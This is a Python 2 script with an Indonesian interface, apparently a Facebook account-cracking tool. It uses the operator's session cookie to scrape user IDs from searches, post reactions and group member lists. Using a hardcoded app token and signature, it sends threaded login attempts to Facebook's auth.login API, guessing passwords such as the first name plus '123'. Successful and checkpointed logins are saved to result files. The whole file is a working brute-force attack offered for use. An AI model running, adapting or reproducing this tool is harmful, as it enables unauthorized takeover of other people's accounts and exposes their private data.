import os
try:
    import requests
except ImportError:
    print " \033[93;1m\n     Kamu belum Install modul Requests,\n   Tekan Enter Untuk Install Requests... "
    raw_input(" ====>")
    os.system("pip install requests" if os.name == 'nt' else 'pip2 install requests')
    
try:
    from bs4 import BeautifulSoup
except ImportError:
    print " \033[93;1m\n     Kamu belum Install modul BeautifulSoup,\n   Tekan Enter Untuk Install BeautifulSoup... "
    raw_input(" ====>")
    os.system("pip install bs4" if os.name == 'nt' else 'pip2 install bs4')

import requests, time, sys, os, subprocess
from bs4 import BeautifulSoup 
from multiprocessing.pool import ThreadPool
from user_dev import *

os.system('cls' if os.name == 'nt' else 'clear')
download()
print '\033[96;1m -------------------------------------'
print("\n\033[42;1m|HACK FB MR.4P4|\033[00;1m")
versi = '0.2'

coki = open('cookie.txt', 'r').read()
cook = { 'cookie': coki }
cek = 'https://mbasic.facebook.com/me'

def masuk_cokie():
  try:
    print "\n"
    print "\033[96;1m   {\033[97;1m Login Dengan Cookie Facebook \033[96;1m}"
    print "\033[97;1m +----------------------------------+"
    print '\033[96;1m  Masukkan Cookie Facebook Kamu dulu..'
    cokli = raw_input("\n ==>\033[97;1m ")
    if cokli == '' or cokli == ' ':
        print "\n  jangan Kosong...."
        masuk_cokie()

    buka = open('cookie.txt', 'w')
    buka.write(cokli)
    buka.close()
    coki = open('cookie.txt', 'r').read()
    cook = { 'cookie': coki }
    cek = 'https://mbasic.facebook.com/me'
    with requests.Session() as res_dev:
        try:
            page = res_dev.get(cek, cookies=cook).content
            soup = BeautifulSoup(page, "html.parser")
        except requests.exceptions.ConnectionError:
            print "\n\tGangguan Koneksi Internet\n"
            sys.exit()
        except ValueError:
            print '\n Cookie Salah..\n Silahkan Masukkan Cookie fb yang Benar'
            masuk_cokie()
    if 'Facebook - Masuk atau Daftar' in str(soup) or 'Masuk ke Facebook' in str(soup):
        print "\n\n\033[91;1m 1. Cookie Salah, Silahkan Login\n Fb kembali di \033[97;1m mbasic.facebook.com\n \033[91;1m Untuk ambil Cookie yang Baru\n"
        masuk_cokie()

    print "\n\033[96;1m  Cookie Suksess..."
    sys.exit("\n\033[97;1m  Jalankan Lagi Toolnya...")
  except KeyboardInterrupt:
    sys.exit('')

if coki == '':
    masuk_cokie()
def buka_cok():
    coki = open('cookie.txt', 'r').read()
    cook = { 'cookie': coki }
    cek = 'https://mbasic.facebook.com/me'

buka_cok()

with requests.Session() as res_dev:
    try:
        page = res_dev.get(cek, cookies=cook).content
        soup = BeautifulSoup(page, "html.parser")
    except requests.exceptions.ConnectionError:
        print "\n\tGangguan Koneksi Internet\n"
        sys.exit()
    except ValueError:
        print '\n Cookie Salah...\n Silahkan Masukkan Cookie fb yang Benar'
        masuk_cokie()
    except NameError:
        print "\n\033[91;1m Cookie Salah..."
        sys.exit('')
try:
    if 'Facebook - Masuk atau Daftar' in str(soup) or 'Masuk ke Facebook' in str(soup):
        print "\n\n\033[91;1m 2. Cookie Salah, Silahkan Login\n Fb kembali di \033[97;1m mbasic.facebook.com\n \033[91;1m Untuk ambil Cookie yang Baru\n"
        masuk_cokie()
except NameError:
    sys.exit()

try:        
    nama = soup.find('title').text
except NameError:
    print " Cookie Salah"
    masuk_cokie()
# print soup.prettify()
# sys.exit()
c = 1
coun = 0
dev_us = []
dev_us_pro = []
has_dev_suc = []
has_dev_cek = []

def crack_dev(iqbal):
    global c
    try:
        pwq = iqbal.replace('.', ' ')
        pas = pwq.split()
        jm_dev = len(pas)
        pasw = pas[0]+'123'
        if '1000' in pwq:
            nam = key_wong.split()
            pasw = nam[0]+'123'
        parameter = {
                    'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
                    'format': 'JSON',
                    'sdk_version': '2',
                    'email': iqbal,
                    'locale': 'en_US',
                    'password': pasw,
                    'sdk': 'ios',
                    'generate_session_cookies': '1',
                    'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
                                        }
        respon = requests.get('https://b-api.facebook.com/method/auth.login', params=parameter)
      
        print '\033[91;1m {\033[97;1m'+str(c)+'\033[91;1m} \033[97;1m'+MR404+ '\033[90;1m ==> Mencoba login '
        if 'EAA' in respon.text:
            print "\n\033[96;1m {\033[97;1mSuc\033[96;1m}\033[96;1m",MR404,"\033[97;1m|\033[96;1m",pasw,'\n'
            has_dev_suc.append('\033[96;1m {\033[97;1mSuc\033[96;1m} \033[97;1m'+MR404+'\033[96;1m | \033[97;1m'+pasw)
            h = open('hasil_sukses.txt', 'a')
            h.write('[Suc] '+MR404+' | '+pasw+' \n')
            h.close()
        elif 'www.facebook.com' in respon.json()['error_msg']:
            print "\n\033[92;1m {\033[93;1mGet\033[92;1m}\033[92;1m",MR404,"\033[97;1m|\033[92;1m",pasw,'\n'
            has_dev_cek.append('\033[97;1m {\033[93;1mCek\033[97;1m} \033[93;1m'+MR404+'\033[97;1m | \033[97;1m'+pasw)
            h = open('hasil_cekpoint.txt', 'a')
            h.write('[Cek] '+MR404+' | '+pasw+' \n')
            h.close()
        else:
            pass
        c+=1
                            
    except requests.exceptions.ConnectionError:
        pass
    except KeyboardInterrupt:
        hasil()
    except:
        pass
        
def run_dev():  
    dev = ThreadPool(5)
    dev.map(crack_dev, set(dev_us_pro))

def run_dev_pro():
    dev = ThreadPool(30)
    dev.map(crack_dev, dev_us_pro)

def hasil():
    hits = 0
    hit = 0
    print "\n\t \033[97;1m Done......."
    print "\033[96;1m===========================================\n"
    print "           \033[96;1m {\033[97;1m Hasill....... \033[96;1m}\n"
    for dev in has_dev_suc:
        print '\033[92;1m  >',dev
        hits+=1
    for dev in has_dev_cek:
        print '\033[93;1m  >',dev
        hit+=1
    tot = hits+hit
    print "\n\033[96;1m {\033[92;1m$\033[96;1m}\033[97;1m Life \033[92;1m:",hits,"\033[96;1m/\033[97;1m Chekpoint \033[93;1m:",hit,"\033[96;1m|\033[92;1m Total \033[97;1m:",tot
    print "\n\033[96;1m===========================================\n"
    data_ganda = []
    up_suc = open('hasil_cekpoint.txt').readlines()
    for dev in up_suc:
        data_ganda.append(dev)
    d = open('hasil_cekpoint.txt', 'w')
    d.write('')
    d.close()
    for dev in set(data_ganda):
        d = open('hasil_cekpoint.txt', 'a')
        d.write(dev)
        d.close()
    # ==========================================
    data_ganda = []
    up_suc = open('hasil_sukses.txt').readlines()
    for dev in up_suc:
        data_ganda.append(dev)
    d = open('hasil_sukses.txt', 'w')
    d.write('')
    d.close()
    for dev in set(data_ganda):
        d = open('hasil_sukses.txt', 'a')
        d.write(dev)
        d.close()
    sys.exit()

def cari_orang():
    try:
        global jumlah, u_orang, coun, us_dev, dev_us_pro, dev_us
        while jumlah*2-1 > coun:
          with requests.Session() as res_dev:
            page = res_dev.get(u_orang, cookies=cook).content
            soup = BeautifulSoup(page, "html.parser")
          dev_us_pro = []
          dev_us = []
          for i in soup.find_all('tbody'):
            for dev in i.find_all('a', class_=False):
                if 'messages' not in dev['href']:
                    us_dev =dev['href']
                    dev_ = us_dev.replace('/', '').replace('?refid=46', '').replace('profile.php?id=', '').replace('&refid=46', '')
                    dev_us.append(str(dev_))
                coun+=1
          for dev1 in dev_us:
              dev_us_pro.append(dev1)
          run_dev()
          if "Lihat Hasil Selanjutnya" in str(page):
              dev = soup.find('a', string='Lihat Hasil Selanjutnya')
              u_orang = dev['href']
              cari_orang()
          if "Lihat Hasil Selanjutnya" not in str(page):
              print '\n Habizzzzzz......'
              jumlah = 1
              hasil()

    except requests.exceptions.ConnectionError:
        print " Gangguan Koneksi Internet... !"
        pass
    except KeyboardInterrupt:
        print 'keluar'
        hasil()
co = 1


def grup():
    global u_grup, co
    with requests.Session() as res:
        page_grup = res.get(u_grup, cookies=cook).content
        soup_grup = BeautifulSoup(page_grup, "html.parser")
    # print soup_grup.prettify()
    for i in soup_grup.find_all('h3'):
      try:
        for dev in i.find_all('a'):
            sys.stdout.write('\r\033[96;1m  >\033[97;1m Sedang Mengumpulkan User ID \033[92;1m: '+str(co))
            dev_url = dev['href']
            dev_id = dev_url.replace('/', '').replace('profile.php?id=', '').replace('?refid=46', '').replace('&refid=46', '')
            dev_us_pro.append(dev_id)
            co+=1
      except requests.exceptions.ConnectionError:
        print " Gangguan Koneksi Internet... !"
        pass

    if "Lihat Selengkapnya" in str(page_grup):
        dev = soup_grup.find('a', string="Lihat Selengkapnya")
        u_grup = 'https://mbasic.facebook.com'+dev['href']
        grup()

def likez():
    c = 1
    with requests.Session() as res_dev:
        page_likez = res_dev.get(u_likes, cookies=cook).content
        soup_likez = BeautifulSoup(page_likez, "html.parser")

    if 'Konten Tidak Ditemukan' in soup_likez.find('title') or 'Halaman Tidak Ditemukan' in soup_likez.find('title'):
        link_id_teman = 'https://youtu.be/xza3GwXGdbk'
        print "\033[97;1m-"*40
        print "\033[91;1m [!] ", soup_likez.find('title').text
        print "\033[97;1m-"*40
        print "\033[93;1m Masukkan ID Postingan dari teman kamu,\n bukan dari Grup ataupun Halaman\n"
        raw_input("\033[97;1m Tekan Enter\n untuk lihat Cara Mengambil ID postingan Teman..")
        print '\033[92;1m Beralih kek Youtube...'
        try:
            subprocess.check_output(['am', 'start', link_id_teman])
        except WindowsError:
            print "\n\033[97;1m Link vidio Cara Ambil ID Postingan Teman..\n\033[93;1m ==>\033[96;1m", link_id_teman
        sys.exit('\n\033[90;1m Keluar')
    for dev in soup_likez.find_all('h3'):
      try:
        for like_dev in dev.find_all('a'):
            id_likez = like_dev['href']
            d = id_likez.replace('/profile.php?id=', '').replace('/', '')
            dev_us_pro.append(d)
            sys.stdout.write('\r\033[96;1m {\033[92;1m#\033[96;1m}\033[97;1m Mengambil ID \033[93;1m: '+str(c))
            c += 1
      except:
        pass
    print ''
    print "\033[96;1m=========================================\n"
    run_dev_pro()

if __name__=="__main__":
    try:
        if 'Facebook - Masuk atau Daftar' in str(soup) or 'Masuk ke Facebook' in str(soup):
            print "\n\n\033[91;1m  3. Cookie Salah, Silahkan Login\n Fb kembali di \033[97;1m mbasic.facebook.com\n \033[91;1m dan ambil Cookie yang Baru\n"
            sys.exit()
     
        
        os.system('cls' if os.name == 'nt' else 'clear')
        print "\n\033[96;1m░█▄█░█▀▄░░░░█░█░▄▀▄░█░█\n"
        print "\n\033[96;1m░█░█░█▀▄░░░░░▀█░█/█░░▀█\n"
        print "\n\033[96;1m░▀░▀░▀░▀░▀░░░░▀░░▀░░░░▀\n"
        print '\033[96;1m ++++++++++++MENU HACK FB+++++++++++++++'
        print '\033[96;1m -------------------------------------'
        print("\n\033[42;1m| {1} Multi Brute Force Serch Poeple|\033[00;1m")
        print("\n\033[42;1m| {2} Multi Brute Force From Like|\033[00;1m")
        print("\n\033[42;1m| {3} Multi Brute Force Grup Fb|\033[00;1m")
        print("\n\033[42;1m| {4} Cara Menggunakan Tool|\033[00;1m")
        print("\n\033[42;1m| {5} Subrek my chennel|\033[00;1m")
        print '\033[96;1m -------------------------------------'
        print '\033[96;1m +++++++++++++++++++++++++++++++++++++++'
        print '\033[96;1m  {\033[92;1m@\033[96;1m}\033[92;1m Hai :\033[97;1m',nama,'\n'
        pilih = raw_input("\033[96;1m {\033[93;1m?\033[96;1m}\033[97;1m Pilih Opsi \033[92;1m: ")
        if pilih == '1':
            banner_cari_orang()
            key_wong = raw_input('\033[96;1m {\033[92;1m#\033[96;1m}\033[97;1m Cari Seseorang \033[94;1m:\033[92;1m ')
            jumlah = input('\033[96;1m {\033[92;1m$\033[96;1m}\033[97;1m Masukkan Limit \033[94;1m:\033[93;1m ')
            if jumlah > 1000:
                print '\033[91;1m----------------------------------------'
                print ' \033[92;1mUps..  Maksimal Limit Hanya \033[93;1m1000 \033[92;1mBoss..'
                jumlah = 1000
            print "\033[96;1m=======================================\n"
            print "\033[96;1m     {\033[92;1m?\033[96;1m}\033[97;1m Sedang Mencari........ \033[96;1m/*\n"
            u_orang = 'https://mbasic.facebook.com/search/people/?q={}'.format(key_wong)
            cari_orang()
            hasil()

        elif pilih == '2':
            key_wong = 'sayang'
            banner_likez()
            id_reack = raw_input("\033[96;1m {\033[92;1m#\033[96;1m}\033[97;1m Id Postingan \033[92;1m: ")
            u_likes = "https://mbasic.facebook.com/ufi/reaction/profile/browser/fetch/?limit=10000000&total_count=19&ft_ent_identifier="+id_reack

            likez()
            hasil()

        elif pilih == '3':
            banner_grup()
            id_grup = raw_input('\033[96;1m {\033[92;1m#\033[96;1m}\033[97;1m Masukkan ID Grup \033[92;1m: ')
            key_wong = raw_input('\033[96;1m {\033[92;1m?\033[96;1m}\033[97;1m Sandi Yang Mungkin Digunakan \033[93;1m: ')
            print "\033[96;1m=========================================\n"
            u_grup = 'https://mbasic.facebook.com/browse/group/members/?id={}'.format(id_grup)
            grup()
            print '\n'
            run_dev_pro()
            hasil()


        elif pilih == '4':
            try:
                subprocess.check_output(['am', 'start', 'https://youtube.com/channel/UC0IpDdp5KzL6RfX1RpUxU7Q'])
            except KeyboardInterrupt:
                subprocess.check_output(['am', 'start', 'https://youtube.com/channel/UC0IpDdp5KzL6RfX1RpUxU7Q'])
            except WindowsError:
                os.system('pro_dev.py' if os.name == 'nt' else 'python2 pro_dev.py')

        elif pilih == '5':
            try:
                print " \n\n \033[97;1m        +++[ \033[96;1m Tools Versi "+versi+" \033[97;1m ]+++" 
                print " "
                print " \n\033[95;1m  SUBSCRIBE MY CHANNEL \033[96;1m(MR.404/RAIHAN)"
                raw_input(" \033[97;1m    Tekan Enter Untuk Membuka youtube..")
                subprocess.check_output(['am', 'start', 'https://youtube.com/channel/UC0IpDdp5KzL6RfX1RpUxU7Q'])
                os.system('pro_dev.py' if os.name == 'nt' else 'python2 pro_dev.py')
            except KeyboardInterrupt:
                subprocess.check_output(['am', 'start', 'https://youtube.com/channel/UC0IpDdp5KzL6RfX1RpUxU7Q'])
                os.system('pro_dev.py' if os.name == 'nt' else 'python2 pro_dev.py')
            except WindowsError:
                os.system('pro_dev.py' if os.name == 'nt' else 'python2 pro_dev.py')
        else:
            sys.exit('\n\033[91;1m Pilih yang Bener Tod...')
    except KeyboardInterrupt:
        sys.exit('  Keluar.....')
